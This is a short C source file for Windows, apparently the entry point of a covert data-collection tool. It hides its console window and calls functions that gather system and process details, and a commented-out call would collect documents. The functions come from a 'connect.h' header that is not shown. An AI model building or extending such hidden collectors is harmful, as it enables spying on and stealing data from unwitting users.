#include <stdio.h>
#include <Windows.h>
#include "connect.h"
#include <TlHelp32.h>

// Release (Set Release x64 to use this)
// Background Task
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
    //DirCheck(); At Rework Progress
    //GetAllDocs();
    DetailedComputerInfo();
    GetProcessInfo();


    return 0;
}

// For Debugger Only (Set Debug x64 Build To use this)
int main() { 
    DetailedComputerInfo();
    GetProcessInfo();
    system("pause>nul");
}